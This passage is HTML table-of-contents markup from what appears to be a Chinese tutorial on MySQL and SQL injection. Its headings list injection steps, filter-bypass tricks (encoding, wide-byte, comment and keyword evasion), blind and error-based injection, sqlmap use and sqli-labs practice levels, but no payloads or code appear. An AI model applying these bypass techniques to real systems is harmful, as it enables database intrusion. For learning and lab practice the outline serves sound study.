class="toc-text">注意事项</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8E%92%E5%BA%8F%E6%9F%A5%E8%AF%A2"><span class="toc-number">3.4.5.</span> <span class="toc-text">排序查询</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9-3"><span class="toc-number">3.4.5.1.</span> <span class="toc-text">注意事项</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E9%A1%B5%E6%9F%A5%E8%AF%A2"><span class="toc-number">3.4.6.</span> <span class="toc-text">分页查询</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9-4"><span class="toc-number">3.4.6.1.</span> <span class="toc-text">注意事项</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DQL%E6%89%A7%E8%A1%8C%E9%A1%BA%E5%BA%8F"><span class="toc-number">3.4.7.</span> <span class="toc-text">DQL执行顺序</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DCL%EF%BC%88%E6%95%B0%E6%8D%AE%E6%8E%A7%E5%88%B6%E8%AF%AD%E8%A8%80%EF%BC%89"><span class="toc-number">3.5.</span> <span class="toc-text">DCL（数据控制语言）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AE%A1%E7%90%86%E7%94%A8%E6%88%B7"><span class="toc-number">3.5.1.</span> <span class="toc-text">管理用户</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9-5"><span class="toc-number">3.5.1.1.</span> <span class="toc-text">注意事项</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6"><span class="toc-number">3.5.2.</span> <span class="toc-text">权限控制</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9-6"><span class="toc-number">3.5.2.1.</span> <span class="toc-text">注意事项</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BD%E6%95%B0"><span class="toc-number">3.6.</span> <span class="toc-text">函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%87%BD%E6%95%B0"><span class="toc-number">3.6.1.</span> <span class="toc-text">字符串函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E5%80%BC%E5%87%BD%E6%95%B0"><span class="toc-number">3.6.2.</span> <span class="toc-text">数值函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%A5%E6%9C%9F%E5%87%BD%E6%95%B0"><span class="toc-number">3.6.3.</span> <span class="toc-text">日期函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%81%E7%A8%8B%E5%87%BD%E6%95%B0"><span class="toc-number">3.6.4.</span> <span class="toc-text">流程函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BA%A6%E6%9D%9F"><span class="toc-number">3.7.</span> <span class="toc-text">约束</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E7%BA%A6%E6%9D%9F"><span class="toc-number">3.7.1.</span> <span class="toc-text">常用约束</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A4%96%E9%94%AE%E7%BA%A6%E6%9D%9F"><span class="toc-number">3.7.2.</span> <span class="toc-text">外键约束</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E4%BA%86%E8%A7%A3-MySQL-%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E8%A1%A8%E5%90%8D%E5%AD%97%E6%AE%B5%E7%AD%89%E4%BF%A1%E6%81%AF%E7%9A%84%E5%AD%98%E5%82%A8"><span class="toc-number">4.</span> <span class="toc-text">四、了解 MySQL 数据库中表名字段等信息的存储</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E4%BA%86%E8%A7%A3%E6%B3%A8%E5%85%A5%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%9F%BA%E6%9C%AC%E6%B5%81%E7%A8%8B"><span class="toc-number">5.</span> <span class="toc-text">五、了解注入的原理及基本流程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-SQL-%E6%B3%A8%E5%85%A5%E7%9A%84%E5%90%AB%E4%B9%89%EF%BC%9A"><span class="toc-number">5.1.</span> <span class="toc-text">1.SQL 注入的含义：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-SQL-%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%9C%AC%E8%B4%A8"><span class="toc-number">5.2.</span> <span class="toc-text">2.SQL 注入基本本质</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-SQL-%E6%B3%A8%E5%85%A5%E7%9A%84%E6%9D%A1%E4%BB%B6"><span class="toc-number">5.3.</span> <span class="toc-text">3.SQL 注入的条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-SQL-%E6%B3%A8%E5%85%A5%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%B5%81%E7%A8%8B"><span class="toc-number">5.4.</span> <span class="toc-text">4.SQL 注入的基本流程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%89%BE%E5%87%BA%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">5.4.1.</span> <span class="toc-text">1. 找出注入点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E5%8F%8A%E9%97%AD%E5%90%88%E7%B1%BB%E5%9E%8B"><span class="toc-number">5.4.2.</span> <span class="toc-text">2.判断注入及闭合类型</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%96%B9%E6%B3%95"><span class="toc-number">5.4.2.1.</span> <span class="toc-text">判断方法</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A"><span class="toc-number">5.4.2.1.1.</span> <span class="toc-text">方法一：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A%EF%BC%88%E5%8F%AA%E6%98%AF%E5%88%A4%E6%96%AD%EF%BC%89"><span class="toc-number">5.4.2.1.2.</span> <span class="toc-text">方法二：（只是判断）</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%89%EF%BC%9A%EF%BC%88%E6%9C%80%E7%AE%80%E5%8D%95%E7%B2%97%E6%9A%B4%E7%9A%84%EF%BC%89"><span class="toc-number">5.4.2.1.3.</span> <span class="toc-text">方法三：（最简单粗暴的）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%88%A4%E6%96%AD%E8%A1%A8%E6%A0%BC%E7%9A%84%E5%88%97%E6%95%B0"><span class="toc-number">5.4.3.</span> <span class="toc-text">3.判断表格的列数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E5%88%A4%E6%96%AD%E5%9B%9E%E6%98%BE%E7%9A%84%E5%88%97%E6%95%B0"><span class="toc-number">5.4.4.</span> <span class="toc-text">4.判断回显的列数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E7%88%86%E5%87%BA%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E7%A7%B0"><span class="toc-number">5.4.5.</span> <span class="toc-text">5.爆出数据库名称</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-%E7%88%86%E5%87%BA%E5%BD%93%E5%89%8D%E6%89%80%E5%B1%9E%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E5%92%8C%E7%89%88%E6%9C%AC"><span class="toc-number">5.4.6.</span> <span class="toc-text">6.爆出当前所属的数据库和版本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-%E7%88%86%E5%87%BA%E8%A1%A8%E5%90%8D"><span class="toc-number">5.4.7.</span> <span class="toc-text">7.爆出表名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-%E7%88%86%E5%87%BA%E5%88%97%E5%90%8D"><span class="toc-number">5.4.8.</span> <span class="toc-text">8.爆出列名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9-%E6%9F%A5%E8%AF%A2"><span class="toc-number">5.4.9.</span> <span class="toc-text">9.查询</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A1%A5%E5%85%85%EF%BC%9A"><span class="toc-number">5.4.10.</span> <span class="toc-text">补充：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E5%B8%B8%E8%A7%81%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="toc-number">6.</span> <span class="toc-text">六、常见的绕过方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%B3%A8%E9%87%8A%E7%AC%A6%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-number">6.1.</span> <span class="toc-text">1.注释符号绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">6.2.</span> <span class="toc-text">2.大小写绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%86%85%E8%81%94%E6%B3%A8%E9%87%8A%E7%BB%95%E8%BF%87"><span class="toc-number">6.3.</span> <span class="toc-text">3.内联注释绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">6.4.</span> <span class="toc-text">4.双写绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">6.5.</span> <span class="toc-text">5.编码绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%B9%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%9B%E8%A1%8C%E4%B8%A4%E6%AC%A1url%E5%85%A8%E7%BC%96%E7%A0%81%EF%BC%9A"><span class="toc-number">6.5.1.</span> <span class="toc-text">对关键字进行两次url全编码：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ascii%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">6.5.2.</span> <span class="toc-text">ascii编码绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#16%E8%BF%9B%E5%88%B6%E7%BB%95%E8%BF%87%EF%BC%9A"><span class="toc-number">6.5.3.</span> <span class="toc-text">16进制绕过：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#unicode%E7%BC%96%E7%A0%81%E5%AF%B9%E9%83%A8%E5%88%86%E7%AC%A6%E5%8F%B7%E7%9A%84%E7%BB%95%E8%BF%87%EF%BC%9A"><span class="toc-number">6.5.4.</span> <span class="toc-text">unicode编码对部分符号的绕过：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E5%A4%A7%E4%BA%8E%E5%B0%8F%E4%BA%8E%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-number">6.6.</span> <span class="toc-text">6.&lt;&gt;大于小于号绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#greatest-%E5%92%8Cleast"><span class="toc-number">6.6.1.</span> <span class="toc-text">greatest()和least()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#strcmp"><span class="toc-number">6.6.2.</span> <span class="toc-text">strcmp()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#in%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toc-number">6.6.3.</span> <span class="toc-text">in关键字</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#between-a-and-b"><span class="toc-number">6.6.4.</span> <span class="toc-text">between a and b</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="toc-number">6.7.</span> <span class="toc-text">7.空格绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-%E5%AF%B9or-and-xor-not-%E7%BB%95%E8%BF%87"><span class="toc-number">6.8.</span> <span class="toc-text">8.对or and xor not 绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-%E5%AF%B9%E7%AD%89%E5%8F%B7-%E7%BB%95%E8%BF%87"><span class="toc-number">6.9.</span> <span class="toc-text">9.对等号&#x3D;绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#like"><span class="toc-number">6.9.1.</span> <span class="toc-text">like</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#REGEXP"><span class="toc-number">6.9.2.</span> <span class="toc-text">REGEXP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A4%A7%E4%BA%8E%E5%8F%B7%E5%B0%8F%E4%BA%8E%E5%8F%B7"><span class="toc-number">6.9.3.</span> <span class="toc-text">大于号小于号</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-%E5%AF%B9%E5%8D%95%E5%BC%95%E5%8F%B7%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number">6.10.</span> <span class="toc-text">10.对单引号的绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6"><span class="toc-number">6.10.1.</span> <span class="toc-text">使用十六进制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E7%BB%95%E8%BF%87"><span class="toc-number">6.10.2.</span> <span class="toc-text">宽字节绕过</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11-%E5%AF%B9%E4%BA%8E%E9%80%97%E5%8F%B7%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number">6.11.</span> <span class="toc-text">11.对于逗号的绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%B9%E4%BA%8Esubstr-%E5%92%8Cmid-%E8%BF%99%E4%B8%A4%E4%B8%AA%E6%96%B9%E6%B3%95%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8from-for-%E7%9A%84%E6%96%B9%E5%BC%8F%E6%9D%A5%E8%A7%A3%E5%86%B3"><span class="toc-number">6.11.1.</span> <span class="toc-text">对于substr()和mid()这两个方法可以使用from for 的方式来解决</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8join%E5%85%B3%E9%94%AE%E5%AD%97%E6%9D%A5%E7%BB%95%E8%BF%87"><span class="toc-number">6.11.2.</span> <span class="toc-text">使用join关键字来绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8like%E5%85%B3%E9%94%AE%E5%AD%97-%E9%80%82%E7%94%A8%E4%BA%8Esubstr-%E7%AD%89%E6%8F%90%E5%8F%96%E5%AD%90%E4%B8%B2%E7%9A%84%E5%87%BD%E6%95%B0%E4%B8%AD%E7%9A%84%E9%80%97%E5%8F%B7"><span class="toc-number">6.11.3.</span> <span class="toc-text">使用like关键字 适用于substr()等提取子串的函数中的逗号</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8offset%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toc-number">6.11.4.</span> <span class="toc-text">使用offset关键字</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#12-%E8%BF%87%E6%BB%A4%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87"><span class="toc-number">6.12.</span> <span class="toc-text">12.过滤函数绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#sleep-%E8%A2%AB%E8%BF%87%E6%BB%A4%E6%97%B6"><span class="toc-number">6.12.1.</span> <span class="toc-text">sleep()被过滤时</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ascii-%E8%A2%AB%E8%BF%87%E6%BB%A4%E6%97%B6"><span class="toc-number">6.12.2.</span> <span class="toc-text">ascii()被过滤时</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#group-concat-%E8%A2%AB%E8%BF%87%E6%BB%A4%E6%97%B6"><span class="toc-number">6.12.3.</span> <span class="toc-text">group_concat()被过滤时</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#substr-substring-mid-%E8%A2%AB%E8%BF%87%E6%BB%A4%E6%97%B6"><span class="toc-number">6.12.4.</span> <span class="toc-text">substr(),substring(),mid()被过滤时</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#user-datadir-ord-%E8%A2%AB%E8%BF%87%E6%BB%A4%E6%97%B6"><span class="toc-number">6.12.5.</span> <span class="toc-text">user() datadir ord()被过滤时</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86if%E5%87%BD%E6%95%B0%EF%BC%9A"><span class="toc-number">6.12.6.</span> <span class="toc-text">过滤了if函数：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%83%E3%80%81%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F%E5%8F%8A%E5%B7%A5%E5%85%B7-sqlmap-%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-number">7.</span> <span class="toc-text">七、注入方式及工具 sqlmap 的使用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap-%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BB%8B%E7%BB%8D"><span class="toc-number">7.1.</span> <span class="toc-text">sqlmap 工具安装及介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%89%E8%A3%85-%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B"><span class="toc-number">7.1.1.</span> <span class="toc-text">安装;安装教程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">7.1.2.</span> <span class="toc-text">使用方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-number">7.2.</span> <span class="toc-text">联合注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">7.3.</span> <span class="toc-text">布尔盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%AB%E4%B9%89%EF%BC%9A"><span class="toc-number">7.3.1.</span> <span class="toc-text">含义：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%87%8D%E8%A6%81%E5%87%BD%E6%95%B0"><span class="toc-number">7.3.2.</span> <span class="toc-text">重要函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A5-Less5-%E4%B8%BA%E4%BE%8B-%E5%B7%B2%E7%9F%A5%E5%8D%95%E5%BC%95%E5%8F%B7%E9%97%AD%E5%90%88"><span class="toc-number">7.3.3.</span> <span class="toc-text">以 Less5 为例(已知单引号闭合)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%8D%E4%BD%BF%E7%94%A8-sqlmap"><span class="toc-number">7.3.3.1.</span> <span class="toc-text">不使用 sqlmap</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E5%BA%93%E9%95%BF%E5%BA%A6"><span class="toc-number">7.3.3.1.1.</span> <span class="toc-text">判断数据库长度</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%86%8D%E5%88%A4%E6%96%AD%E5%88%A4%E6%96%AD%E5%85%B7%E4%BD%93%E5%AD%97%E7%AC%A6"><span class="toc-number">7.3.3.1.2.</span> <span class="toc-text">再判断判断具体字符</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E9%9C%80%E8%A6%81%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%89%80%E6%9C%89%E8%A1%A8%E7%9A%84%E9%95%BF%E5%BA%A6"><span class="toc-number">7.3.3.1.3.</span> <span class="toc-text">判断需要的数据库的所有表的长度</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%86%8D%E5%88%A4%E6%96%AD%E5%88%A4%E6%96%AD%E6%89%80%E6%9C%89%E8%A1%A8%E5%85%B7%E4%BD%93%E5%AD%97%E7%AC%A6"><span class="toc-number">7.3.3.1.4.</span> <span class="toc-text">再判断判断所有表具体字符</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E9%9C%80%E8%A6%81%E7%9A%84%E6%89%80%E6%9C%89%E8%A1%A8%E4%B8%AD%E6%89%80%E6%9C%89%E5%AD%97%E6%AE%B5%E7%9A%84%E9%95%BF%E5%BA%A6"><span class="toc-number">7.3.3.1.5.</span> <span class="toc-text">判断需要的所有表中所有字段的长度</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%86%8D%E5%88%A4%E6%96%AD%E5%88%A4%E6%96%AD%E6%89%80%E6%9C%89%E5%AD%97%E6%AE%B5%E5%85%B7%E4%BD%93%E5%AD%97%E7%AC%A6"><span class="toc-number">7.3.3.1.6.</span> <span class="toc-text">再判断判断所有字段具体字符</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E9%9C%80%E8%A6%81%E7%9A%84%E8%AF%A5%E5%AD%97%E6%AE%B5%E4%B8%8B%E6%89%80%E6%9C%89%E5%86%85%E5%AE%B9%E7%9A%84%E9%95%BF%E5%BA%A6"><span class="toc-number">7.3.3.1.7.</span> <span class="toc-text">判断需要的该字段下所有内容的长度</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%86%8D%E5%88%A4%E6%96%AD%E5%88%A4%E6%96%AD%E6%89%80%E6%9C%89%E5%86%85%E5%AE%B9%E5%85%B7%E4%BD%93%E5%AD%97%E7%AC%A6"><span class="toc-number">7.3.3.1.8.</span> <span class="toc-text">再判断判断所有内容具体字符</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC%E4%BB%A3%E7%A0%81"><span class="toc-number">7.3.3.1.9.</span> <span class="toc-text">脚本代码</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-sqlmap"><span class="toc-number">7.3.3.2.</span> <span class="toc-text">使用 sqlmap</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BB%B6%E6%97%B6%E7%9B%B2%E6%B3%A8"><span class="toc-number">7.4.</span> <span class="toc-text">延时盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%87%8D%E8%A6%81%E5%87%BD%E6%95%B0-1"><span class="toc-number">7.4.1.</span> <span class="toc-text">重要函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A5-Less9-%E4%B8%BA%E4%BE%8B"><span class="toc-number">7.4.2.</span> <span class="toc-text">以 Less9 为例</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%89%8B%E6%B3%A8%EF%BC%88%E6%BC%94%E7%A4%BA%EF%BC%89"><span class="toc-number">7.4.2.1.</span> <span class="toc-text">手注（演示）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-sqlmap-1"><span class="toc-number">7.4.2.2.</span> <span class="toc-text">使用 sqlmap</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POST-%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">7.5.</span> <span class="toc-text">POST 型注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E6%B3%A8"><span class="toc-number">7.5.1.</span> <span class="toc-text">手注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-sqlmap-2"><span class="toc-number">7.5.2.</span> <span class="toc-text">使用 sqlmap</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">7.6.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="toc-number">7.6.1.</span> <span class="toc-text">原理：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#extractvalue%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">7.6.2.</span> <span class="toc-text">extractvalue报错注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#updatexml%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">7.6.3.</span> <span class="toc-text">updatexml报错注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#floor%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">7.6.4.</span> <span class="toc-text">floor报错注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9A%E4%BB%A5-Less17-%E4%B8%BA%E4%BE%8B"><span class="toc-number">7.6.5.</span> <span class="toc-text">例题：以 Less17 为例</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#extractvalue%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-1"><span class="toc-number">7.6.5.1.</span> <span class="toc-text">extractvalue报错注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#updatexml%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-1"><span class="toc-number">7.6.5.2.</span> <span class="toc-text">updatexml报错注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#sqlmap"><span class="toc-number">7.6.5.3.</span> <span class="toc-text">sqlmap</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AB%E3%80%81sqli-labs-%E9%9D%B6%E5%9C%BA%EF%BC%88BUU-%E9%A2%98%E5%BA%93%EF%BC%89"><span class="toc-number">8.</span> <span class="toc-text">八、sqli-labs 靶场（BUU 题库）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Less1-Less4%EF%BC%88%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="toc-number">8.1.</span> <span class="toc-text">Less1-Less4（联合注入）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Less1%EF%BC%9A"><span class="toc-number">8.1.1.</span> <span class="toc-text">Less1：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less2%EF%BC%9A"><span class="toc-number">8.1.2.</span> <span class="toc-text">Less2：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less3%EF%BC%9A"><span class="toc-number">8.1.3.</span> <span class="toc-text">Less3：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less4%EF%BC%9A"><span class="toc-number">8.1.4.</span> <span class="toc-text">Less4：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less5-Less8%EF%BC%88%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%EF%BC%89"><span class="toc-number">8.2.</span> <span class="toc-text">Less5-Less8（布尔盲注）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Less5%EF%BC%9A"><span class="toc-number">8.2.1.</span> <span class="toc-text">Less5：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less6%EF%BC%9A"><span class="toc-number">8.2.2.</span> <span class="toc-text">Less6：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less7%EF%BC%9A"><span class="toc-number">8.2.3.</span> <span class="toc-text">Less7：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%88%E6%B5%8B%E8%AF%95%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B7%EF%BC%89"><span class="toc-number">8.2.3.1.</span> <span class="toc-text">第一步（测试单双引号）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" 